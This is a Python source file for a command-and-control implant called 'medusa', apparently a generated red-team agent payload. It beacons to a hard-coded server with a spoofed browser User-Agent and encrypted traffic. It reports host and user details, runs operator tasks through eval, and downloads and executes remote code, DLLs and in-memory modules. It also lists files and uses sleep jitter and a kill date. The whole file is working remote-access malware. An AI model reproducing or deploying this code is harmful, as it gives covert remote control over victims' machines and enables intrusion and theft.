import os, random, sys, json, socket, base64, time, platform, ssl
import urllib.request
from datetime import datetime
import threading, queue

CHUNK_SIZE = 51200

class medusa:
    def encrypt(self, data):
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import hashes, hmac, padding
        from cryptography.hazmat.backends import default_backend

        if not self.agent_config["enc_key"]["value"] == "none" and len(data)>0:
            key = base64.b64decode(self.agent_config["enc_key"]["enc_key"])
            iv = os.urandom(16)

            backend = default_backend()
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
            encryptor = cipher.encryptor()

            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data)
            padded_data += padder.finalize()

            ct = encryptor.update(padded_data) + encryptor.finalize()

            h = hmac.HMAC(key, hashes.SHA256(), backend)
            h.update(iv + ct)
            hmac = h.finalize()

            output = iv + ct + hmac
            return output
        else:
            return data

    def decrypt(self, data):
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import hashes, hmac, padding
        from cryptography.hazmat.backends import default_backend

        if not self.agent_config["enc_key"]["value"] == "none":
            if len(data)>0:
                backend = default_backend()

                key = base64.b64decode(self.agent_config["enc_key"]["dec_key"])
                uuid = data[:36]
                iv = data[36:52]
                ct = data[52:-32]
                received_hmac = data[-32:]

                h = hmac.HMAC(key, hashes.SHA256(), backend)
                h.update(iv + ct)
                hmac = h.finalize()

                if base64.b64encode(hmac) == base64.b64encode(received_hmac):
                    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
                    decryptor = cipher.decryptor()
                    pt = decryptor.update(ct) + decryptor.finalize()
                    unpadder = padding.PKCS7(128).unpadder()
                    decrypted_data = unpadder.update(pt)
                    decrypted_data += unpadder.finalize()
                    return (uuid+decrypted_data).decode()
                else: return ""
            else: return ""
        else:
            return data.decode()


    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()

    def getUsername(self):
        try: return os.getlogin() 
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]: 
            if k in os.environ.keys(): return os.environ[k]

    def formatMessage(self, data):
        return base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))

    def formatResponse(self, data):
        return json.loads(data.replace(self.agent_config["UUID"],""))

    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))

    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data))))

    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)

    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]: 
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                        if resp["task_id"] == t["task_id"] \
                        and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
        except: pass

    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"] 
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True                        
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error

    def processTaskings(self):
        threads = list()       
        taskings = self.taskings     
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.postMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    def checkIn(self):
        data = {
            "action": "checkin",
            "ip": socket.gethostbyname(socket.gethostname()),
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": socket.gethostname(),
            "domain:": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
        if("status" in decoded_data):
            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False

    def makeRequest(self, data, method='GET'):
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header["name"]] = header["value"]
        if method == 'GET':
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), None, hdrs)
        else:
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
        
        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                        self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                auth = urllib.request.HTTPBasicAuthHandler()
                opener = urllib.request.build_opener(proxy, auth, handler)
            else:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                opener = urllib.request.build_opener(proxy, handler)
            urllib.request.install_opener(opener)
        try:
            with urllib.request.urlopen(req) as response:
                out = base64.b64decode(response.read())
                return out.decode() if method == 'GET' else out 
        except: return ""

    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        if datetime.now() >= kd: return True
        else: return False

    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))    
        time.sleep(self.agent_config["Sleep"]+j)

    def load_script(self, task_id, file):
        total_chunks = 1
        chunk_num = 0
        cmd_code = ""
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num+1 }, "task_id": task_id }
                ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            cmd_code += base64.b64decode(chunk["chunk_data"]).decode()
            
        if cmd_code: exec(cmd_code)
        else: return "Failed to load script"

    def exit(self, task_id):
        os._exit(0)

    def load(self, task_id, file_id, command):
        total_chunks = 1
        chunk_num = 0
        cmd_code = ""
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": chunk_num+1 }, "task_id": task_id }
                ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            cmd_code += base64.b64decode(chunk["chunk_data"]).decode()

        if cmd_code:
            exec(cmd_code.replace("\n    ","\n")[4:])
            setattr(medusa, command, eval(command))
            cmd_list = [{"action": "add", "cmd": command}]
            responses = [{ "task_id": task_id, "user_output": "Loaded command: {}".format(command), "commands": cmd_list, "completed": True }]
            message = { "action": "post_response", "responses": responses }
            response_data = self.postMessageAndRetrieveResponse(message)
        else: return "Failed to upload '{}' command".format(command)

    def ls(self, task_id, path, file_browser=False):
        if path == ".": file_path = self.current_directory
        else: file_path = path if path[0] == os.sep \
                else os.path.join(self.current_directory,path)
        file_details = os.stat(file_path)
        target_is_file = os.path.isfile(file_path)
        target_name = os.path.basename(file_path.rstrip(os.sep))
        file_browser = {
            "host": socket.gethostname(),
            "is_file": target_is_file,
            "permissions": {"octal": oct(file_details.st_mode)[-3:]},
            "name": target_name if target_name not in [".", "" ] \
                    else os.path.basename(self.current_directory.rstrip(os.sep)),        
            "parent_path": os.path.abspath(os.path.join(file_path, os.pardir)),
            "success": True,
            "access_time": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(file_details.st_atime)),
            "modify_time": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(file_details.st_mtime)),
            "size": file_details.st_size,
            "update_deleted": True,
        }
        files = []
        if not target_is_file:
            with os.scandir(file_path) as entries:
                for entry in entries:
                    file = {}
                    file['name'] = entry.name
                    file['is_file'] = True if entry.is_file() else False
                    try:
                        file_details = os.stat(os.path.join(file_path, entry.name))
                        file["permissions"] = { "octal": oct(file_details.st_mode)[-3:]}
                        file["access_time"] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(file_details.st_atime))
                        file["modify_time"] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(file_details.st_mtime))
                        file["size"] = file_details.st_size
                    except OSError as e:
                        pass
                    files.append(file)  
        file_browser["files"] = files
        task = [task for task in self.taskings if task["task_id"] == task_id]
        task[0]["file_browser"] = file_browser
        return { "files": files, "parent_path": os.path.abspath(os.path.join(file_path, os.pardir)), "name":  target_name if target_name not in  [".", ""] \
                    else os.path.basename(self.current_directory.rstrip(os.sep))  }

    def load_dll(self, task_id, dllpath, dllexport):
        from ctypes import WinDLL
        dll_file_path = dllpath if dllpath[0] == os.sep \
                else os.path.join(self.current_directory,dllpath)
        loaded_dll = WinDLL(dll_file_path)
        eval("{}.{}()".format("loaded_dll",dllexport))
        return "[*] {} Loaded.".format(dllpath)

    def load_module(self, task_id, file, module_name):
        import zipfile, io

        class CFinder(object):
            def __init__(self, repoName, instance):
                self.moduleRepo = instance.moduleRepo
                self.repoName = repoName
                self._source_cache = {}

            def _get_info(self, repoName, fullname):
                parts = fullname.split('.')
                submodule = parts[-1]
                modulepath = '/'.join(parts)
                _search_order = [('.py', False), ('/__init__.py', True)]
                for suffix, is_package in _search_order:
                    relpath = modulepath + suffix
                    try: self.moduleRepo[repoName].getinfo(relpath)
                    except KeyError: pass
                    else: return submodule, is_package, relpath
                msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
                raise ImportError(msg)

            def _get_source(self, repoName, fullname):
                submodule, is_package, relpath = self._get_info(repoName, fullname)
                fullpath = '%s/%s' % (repoName, relpath)
                if relpath in self._source_cache:
                    source = self._source_cache[relpath]
                    return submodule, is_package, fullpath, source
                try:
                    source =  self.moduleRepo[repoName].read(relpath)
                    source = source.replace(b'\r\n', b'\n')
                    source = source.replace(b'\r', b'\n')
                    self._source_cache[relpath] = source
                    return submodule, is_package, fullpath, source
                except: raise ImportError("Unable to obtain source for module %s" % (fullpath))

            def find_module(self, fullname, path=None):
                try: submodule, is_package, relpath = self._get_info(self.repoName, fullname)
                except ImportError: return None
                else: return self

            def load_module(self, fullname):
                import types
                submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
                code = compile(source, fullpath, 'exec')
                mod = sys.modules.setdefault(fullname, types.ModuleType(fullname))
                mod.__loader__ = self
                mod.__file__ = fullpath
                mod.__name__ = fullname
                if is_package:
                    mod.__path__ = [os.path.dirname(mod.__file__)]
                exec(code, mod.__dict__)
                return mod

            def get_data(self, fullpath):

                prefix = os.path.join(self.repoName, '')
                if not fullpath.startswith(prefix):
                    raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
                relpath = fullpath[len(prefix):]
                try:
                    return self.moduleRepo[self.repoName].read(relpath)
                except KeyError:
                    raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

            def is_package(self, fullname):
                """Return if the module is a package"""
                submodule, is_package, relpath = self._get_info(self.repoName, fullname)
                return is_package

            def get_code(self, fullname):
                submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
                return compile(source, fullpath, 'exec')

        if module_name in self.moduleRepo.keys():
            return "{} module already loaded.".format(module_name)
        total_chunks = 1
        chunk_num = 0
        module_zip = bytearray()
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num+1 }, "task_id": task_id }
                ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            total_chunks = chunk["total_chunks"]
            chunk_num+=1
            module_zip.extend(base64.b64decode(chunk["chunk_data"]))

        if module_zip:
            self.moduleRepo[module_name] = zipfile.ZipFile(io.BytesIO(module_zip))
            if module_name not in self._meta_cache:
                finder = CFinder(module_name, self)
                self._meta_cache[module_name] = finder
                sys.meta_path.append(finder)        
        else: return "Failed to download in-memory module"



    def __init__(self):
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
            "Server": "http://10.0.2.15",
            "Port": "80",
            "PostURI": "/data",
            "PayloadUUID": "84e9f638-0476-40d3-bfa6-62a785f4ec6f",
            "UUID": "",
            "Headers": [{"name": "User-Agent", "key": "User-Agent", "value": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"}],
            "Sleep": 10,
            "Jitter": 23,
            "KillDate": "2023-03-22",
            "enc_key": {"value": "aes256_hmac", "enc_key": "KO0g7WdyBewcJHyAWM1CuAQysMEcRBiSSFmRTLdXkKw=", "dec_key": "KO0g7WdyBewcJHyAWM1CuAQysMEcRBiSSFmRTLdXkKw="},
            "ExchChk": "T",
            "GetURI": "/index",
            "GetParam": "q",
            "ProxyHost": "",
            "ProxyUser": "",
            "ProxyPass": "",
            "ProxyPort": "",
        }

        while(True):
            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while(True):
                    if self.passedKilldate():
                        self.exit()
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except: pass
                    self.agentSleep()                   

if __name__ == "__main__":
    medusa = medusa()
